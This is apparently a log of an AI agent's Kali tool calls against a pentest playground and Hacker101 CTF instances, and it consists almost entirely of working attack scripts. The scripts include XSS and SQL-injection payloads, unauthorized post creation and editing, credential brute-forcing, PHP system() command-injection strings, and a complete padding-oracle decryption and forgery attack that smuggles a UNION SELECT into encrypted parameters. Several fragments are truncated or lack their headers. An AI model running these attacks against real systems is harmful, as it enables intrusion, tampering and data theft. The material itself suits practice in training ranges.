tools.name: run_kali_command
tools.cmd:
python3 - <<'PY'
import requests, re, urllib3
urllib3.disable_warnings()
base='https://pentest-ground.com:81'
paths=['/robots.txt','/sitemap.xml','/login','/register','/search','/create','/blog','/about','/contact','/admin','/dashboard','/api','/graphql']
for p in paths:
    try:
        r=requests.get(base+p,verify=False,timeout=8,allow_redirects=False)
        print(f'=== {p} {r.status_code} len={len(r.text)} loc={r.headers.get("Location","")}')
        print(r.text[:500].replace('\n',' ')[:500])
        print()
    except Exception as e:
        print(f'ERR {p} {e}')
PY

tools.name: run_kali_command
tools.cmd:
python3 - <<'PY'
import requests, urllib3, re
urllib3.disable_warnings()
base='https://pentest-ground.com:81'
s=requests.Session()
# inspect search reflection
payload="ghostreflect123'\"<svg/onload=alert(1)>"
r=s.get(base+'/search',params={'query':payload},verify=False,timeout=10)
text=r.text
print('search_status',r.status_code)
print('reflected',payload in text)
for m in re.finditer('ghostreflect123',text):
    print(text[max(0,m.start()-120):m.start()+220].replace('\n',' '))
# inspect create unauth access and field reflection hints
r2=s.get(base+'/create',verify=False,timeout=10)
print('create_status',r2.status_code,'login_required',('login' in r2.url and r2.history))
PY

import requests, re, urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings()
base='https://pentest-ground.com:81'
for p in ['/login','/search','/create','/blog']:
    r=requests.get(base+p,verify=False,timeout=10)
    print('\n### PAGE',p,'status',r.status_code)
    print('forms',r.text.count('<form'))
    soup=BeautifulSoup(r.text,'html.parser')
    for i,f in enumerate(soup.find_all('form'),1):
        print('FORM',i,'action=',f.get('action'),'method=',f.get('method'))
        for inp in f.find_all(['input','textarea','select']):
            print(' ',inp.name,'name=',inp.get('name'),'type=',inp.get('type'),'value=',inp.get('value'))
PY

import requests, urllib3, re

base='https://pentest-ground.com:81'

# unauth post creation attempt
payload_title='ghost-post-test'
payload_content='content from unauth test'
payload_ref='https://example.com'
r=s.post(base+'/create',data={'title':payload_title,'content':payload_content,'reference':payload_ref},verify=False,timeout=10,allow_redirects=True)
print('create_post_status',r.status_code,'final_url',r.url)

tools.cmd:
python3 - <<'PY'
import requests, urllib3, re
urllib3.disable_warnings()
base='https://pentest-ground.com:81'
s=requests.Session()
# login SQLi probes
payloads=["' or '1'='1","admin'--","' UNION SELECT 1--","\" or \"1\"=\"1"]
for u in payloads:
    r=s.post(base+'/login',data={'username':u,'password':'x'},verify=False,timeout=10,allow_redirects=False)
    print('PAYLOAD',u,'status',r.status_code,'loc',r.headers.get('Location',''),'set-cookie',r.headers.get('Set-Cookie','')[:120])
    if r.status_code in (301,302,303,307,308):
        print(' redirect body',r.text[:150].replace('\n',' '))
# default creds quick check
for user,pw in [('admin','admin'),('admin','password'),('test','test'),('user','password')]:
    r=s.post(base+'/login',data={'username':user,'password':pw},verify=False,timeout=10,allow_redirects=False)
    print('CREDS',user,pw,'status',r.status_code,'loc',r.headers.get('Location',''))
PY

tools.name: run_kali_command
tools.cmd:
python3 - <<'PY'
import requests, urllib3, re, html
urllib3.disable_warnings()
base='https://pentest-ground.com:81'
s=requests.Session()
marker='<script>alert(81)</script>GHOSTXSS81'
r=s.post(base+'/create',data={'title':'xsstest','content':marker,'reference':'https://example.com'},verify=False,timeout=10)
text=r.text
print('status',r.status_code)
print('raw_marker_present', marker in text)
print('escaped_marker_present', html.escape(marker) in text)
for token in ['GHOSTXSS81','<script>alert(81)</script>']:
    if token in text:
        i=text.find(token)
        print(text[max(0,i-150):i+250].replace('\n',' '))
PY

tools.cmd:
python3 - <<'PY'
import requests, urllib3, re
urllib3.disable_warnings()
base='https://pentest-ground.com:81'
s=requests.Session()
marker='GHOST_EDIT_CONFIRM_81'
# fetch current post 1
orig=s.get(base+'/post/1',verify=False,timeout=10).text
print('orig_has_marker', marker in orig)
# attempt unauthorized edit
r=s.post(base+'/1/edit',data={'title':'What is Lorem Ipsum?','content':marker,'reference':'https://example.com/edited'},verify=False,timeout=10,allow_redirects=True)
print('edit_status',r.status_code,'final_url',r.url)
# verify
vr=s.get(base+'/post/1',verify=False,timeout=10)
print('marker_present_after', marker in vr.text)
if marker in vr.text:
    idx=vr.text.find(marker)
    print(vr.text[max(0,idx-150):idx+250].replace('\n',' '))
PY

tools.cmd:
python3 - <<'PY' import requests,re base='https://566dd9dd1cc29f58da2448fbdd2f73f5.ctf.hacker101.com' s=requests.Session() # try payload classes not used yet to trigger final flag payloads=[ ('svg_onload', {'title':'z','body':''}), ('details_ontoggle', {'title':'z','body':'
'}), ('marquee_onstart', {'title':'z','body':'x'}), ('body_onload', {'title':'z','body':''}), ('img_title', {'title':'','body':'z'}), ('broken_attr_title', {'title':'\">','body':'z'}), ('anchor_onfocus', {'title':'z','body':''}), ('video_onerror', {'title':'z','body':''}), ] for name,p in payloads: r=s.post(base+'/page/create',data=p,allow_redirects=True,timeout=15) txt=r.text flags=re.findall(r'\^FLAG\^([A-Fa-f0-9]{32,})\$FLAG\$',txt) print('\n===',name,r.url,r.status_code,'===') print(txt[:800].replace('\n',' ')) if flags: print('FLAGS',flags) # inspect homepage after inserts for new reflected/scripted flags r=s.get(base+'/',timeout=15) flags=re.findall(r'\^FLAG\^([A-Fa-f0-9]{32,})\$FLAG\$',r.text) print('\nHOME_FLAGS',flags) print(r.text[:1500]) PY

tools.name: run_kali_command
tools.cmd:
python3 - <<'PY'
import requests,re
base='https://566dd9dd1cc29f58da2448fbdd2f73f5.ctf.hacker101.com'
s=requests.Session()
# inspect specific candidate pages created by title-based injections to see if a distinct final flag appears
for i in [21,22,23,24,25]:
    r=s.get(f'{base}/page/{i}',timeout=10)
    print('\n=== PAGE',i,'===')
    print(r.text[:1200])
    print('FLAGS', re.findall(r'\^FLAG\^([A-Fa-f0-9]{32,})\$FLAG\$', r.text))
    er=s.get(f'{base}/page/edit/{i}',timeout=10)
    print('EDIT_FLAGS', re.findall(r'\^FLAG\^([A-Fa-f0-9]{32,})\$FLAG\$', er.text))
PY

tools.name: run_kali_command
tools.cmd:
python3 - <<'PY'
import requests,re
base='https://566dd9dd1cc29f58da2448fbdd2f73f5.ctf.hacker101.com'
s=requests.Session()
# final remaining path likely SQLi/tamper-on-edit. Try quote-based payloads against editable page 9 body/title.
cases=[
 ('edit9_title_quote', '/page/edit/9', {'title':"'",'body':'x'}),
 ('edit9_body_quote', '/page/edit/9', {'title':'x','body':"'"}),
 ('edit9_title_sqli1', '/page/edit/9', {'title':"a'",'body':'x'}),
 ('edit9_body_sqli1', '/page/edit/9', {'title':'x','body':"a'"}),
 ('edit8_body_quote', '/page/edit/8', {'title':'Test','body':"'"}),
 ('edit10_body_quote', '/page/edit/10', {'title':'<','body':"'"}),
]
for name,path,data in cases:
    r=s.post(base+path,data=data,allow_redirects=True,timeout=15)
    txt=r.text
    flags=re.findall(r'\^FLAG\^([A-Fa-f0-9]{32,})\$FLAG\$',txt)
    print('\n===',name,'===')
    print('URL',r.url,'STATUS',r.status_code)
    print(txt[:1200])
    print('FLAGS',flags)
PY

tools.cmd:
python3 - <<'PY'
import requests,re,itertools
u='https://55363a6130efc4c0daff4514fd090d75.ctf.hacker101.com/?page=admin.auth.inc'
users=['admin','cody','test','administrator']
passes=['admin','password','cody','test','blog','123456','letmein']
for user,pw in itertools.product(users,passes):
    r=requests.post(u,data={'username':user,'password':pw},allow_redirects=True,timeout=10)
    txt=r.text
    if 'invalid' not in txt.lower() and 'login failed' not in txt.lower() and 'Admin Login' not in txt:
        print('CANDIDATE',user,pw,'status',r.status_code,'len',len(txt))
        print(txt[:1200])
        print('---')
PY

import requests
u='https://55363a6130efc4c0daff4514fd090d75.ctf.hacker101.com/'
for payload in [
    "<?php system('ls -la'); ?>",
    "<?php system('pwd'); ?>",

    "<?php system('env'); ?>",
]:

tools.cmd:
python3 - <<'PY'
from PIL import Image
import requests, os
base='https://da1dce52f716446bec9bc4730b1ae5bb.ctf.hacker101.com/'
for i in [1,2]:
    fn=f'/tmp/h101_{i}.jpg'
    if not os.path.exists(fn):
        open(fn,'wb').write(requests.get(base+f'fetch?id={i}',timeout=15).content)
    img=Image.open(fn).convert('RGB')
    w,h=img.size
    # detect near-white text on white bg by listing low-frequency colors and basic LSB text extraction
    colors=img.getcolors(maxcolors=w*h)
    print('\nIMG',i,'size',w,h,'unique_colors',len(colors) if colors else 'many')
    # lsb extract first 400 chars from RGB channels combined
    bits=[]
    for y in range(h):
        for x in range(w):
            r,g,b=img.getpixel((x,y))
            bits.extend([r&1,g&1,b&1])
    out=[]
    for j in range(0,min(len(bits)//8,400)):
        byte=0
        for k in range(8):
            byte=(byte<<1)|bits[j*8+k]
        out.append(byte)
    s=''.join(chr(c) if 32<=c<127 else '.' for c in out)
    print('LSB_ASCII_HEAD',s[:400])
PY

tools.name: run_kali_command
tools.cmd:
python3 - <<'PY'
import requests, base64, json, os, random, time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE='https://cceed40bb6837d2c2e9a6f08ddd821c8.ctf.hacker101.com/'
S=requests.Session()

b64d=lambda x: base64.b64decode(x.replace('~','=').replace('!','/').replace('-','+'))
b64e=lambda x: base64.b64encode(x).decode().replace('=','~').replace('/','!').replace('+','-')

def oracle(raw):
    ct=b64e(raw)
    r=S.get(BASE,params={'post':ct},timeout=15)
    t=r.text
    if 'PaddingException' in t:
        return False,t
    if '^FLAG^' in t or 'Attempting to decrypt page with title:' in t or '<!doctype html>' in t.lower() or 'Traceback' in t:
        return True,t
    return True,t

def split_blocks(x,n=16):
    return [x[i:i+n] for i in range(0,len(x),n)]

def decrypt_block(prev,cur):
    inter=[0]*16
    plain=[0]*16
    crafted=bytearray(16)
    for pos in range(15,-1,-1):
        pad=16-pos
        for i in range(pos+1,16):
            crafted[i]=inter[i]^pad
        found=None
        guesses=list(range(256))
        random.shuffle(guesses)
        for g in guesses:
            crafted[pos]=g
            valid,txt=oracle(bytes(crafted)+cur)
            if valid:
                inter[pos]=g^pad
                plain[pos]=inter[pos]^prev[pos]
                found=g
                break
        if found is None:
            raise Exception('no byte found at %d'%pos)
    return bytes(plain), bytes(inter)

def decrypt_cipher(ct_raw):
    blocks=split_blocks(ct_raw)
    out=b''
    inters=[]
    for i in range(1,len(blocks)):
        p,inter=decrypt_block(blocks[i-1],blocks[i])
        out+=p
        inters.append(inter)
        print('DECRYPTED_BLOCK',i,p)
    pad=out[-1]
    if 1 <= pad <= 16 and out.endswith(bytes([pad])*pad):
        out=out[:-pad]
    return out, inters, blocks

def encrypt_plaintext(pt):
    pad=16-(len(pt)%16)
    pt=pt+bytes([pad])*pad
    pblocks=split_blocks(pt)
    last=os.urandom(16)
    blocks=[last]
    for p in pblocks[::-1]:
        inter=[0]*16
        crafted=bytearray(16)
        for pos in range(15,-1,-1):
            padv=16-pos
            for i in range(pos+1,16):
                crafted[i]=inter[i]^padv
            found=None
            for g in range(256):
                crafted[pos]=g
                valid,txt=oracle(bytes(crafted)+blocks[0])
                if valid:
                    inter[pos]=g^padv
                    found=g
                    break
            if found is None:
                raise Exception('encrypt fail pos %d'%pos)
        cprev=bytes([inter[i]^p[i] for i in range(16)])
        blocks.insert(0,cprev)
        print('BUILT_BLOCK_FOR',p)
    return b''.join(blocks)

# sample ciphertext
r=S.post(BASE,data={'title':'x','body':'y'},allow_redirects=False,timeout=15)
ct=r.headers['Location'].split('post=')[1]
raw=b64d(ct)
print('BLOCKS',len(raw)//16)
pt,inters,blocks=decrypt_cipher(raw)
print('PLAINTEXT',pt)
try:
    print('JSON',json.loads(pt.decode()))
except Exception as e:
    print('JSONERR',e)

# flag2 is inside decrypted JSON if present
# now craft id=1 for next flag
payload=b'{"id":"1"}'
enc=encrypt_plaintext(payload)
encs=b64e(enc)
print('ENC_ID1',encs)
r2=S.get(BASE,params={'post':encs},timeout=20)
print('ID1_RESPONSE',r2.text[:2000])

# craft SQLi to dump tracking headers in one shot
payload2=b'{"id":"NULL UNION SELECT GROUP_CONCAT(headers),\"\" FROM tracking"}'
enc2=encrypt_plaintext(payload2)
encs2=b64e(enc2)
print('ENC_SQLI',encs2)
r3=S.get(BASE,params={'post':encs2},timeout=20)
print('SQLI_RESPONSE',r3.text[:4000])
PY

tools.cmd:
python3 - <<'PY'
import requests, base64, json, os, random, sys
BASE='https://cceed40bb6837d2c2e9a6f08ddd821c8.ctf.hacker101.com/'
S=requests.Session()
b64d=lambda x: base64.b64decode(x.replace('~','=').replace('!','/').replace('-','+'))
b64e=lambda x: base64.b64encode(x).decode().replace('=','~').replace('/','!').replace('+','-')

def oracle(raw):
    ct=b64e(raw)
    r=S.get(BASE,params={'post':ct},timeout=10)
    t=r.text
    return 'PaddingException' not in t, t

def split_blocks(x,n=16):
    return [x[i:i+n] for i in range(0,len(x),n)]

def decrypt_block(prev,cur):
    inter=[0]*16
    plain=[0]*16
    crafted=bytearray(16)
    for pos in range(15,-1,-1):
        pad=16-pos
        for i in range(pos+1,16):
            crafted[i]=inter[i]^pad
        for g in range(256):
            crafted[pos]=g
            valid,_=oracle(bytes(crafted)+cur)
            if valid:
                inter[pos]=g^pad
                plain[pos]=inter[pos]^prev[pos]
                print('pos',pos,'plain_byte',plain[pos], flush=True)
                break
        else:
            raise Exception('no byte found at %d'%pos)
    return bytes(plain)

r=S.post(BASE,data={'title':'x','body':'y'},allow_redirects=False,timeout=10)
ct=r.headers['Location'].split('post=')[1]
raw=b64d(ct)
blocks=split_blocks(raw)
print('num_blocks',len(blocks), flush=True)
p1=decrypt_block(blocks[0],blocks[1])
print('block1',p1, flush=True)
PY

    r=requests.get(base,params={'post':q},timeout=12)
    print('Q',q)
    print(re.findall(r'\^FLAG\^[0-9a-f]+\$FLAG\$',r.text))
    print(r.text[:1200])
    print('---')
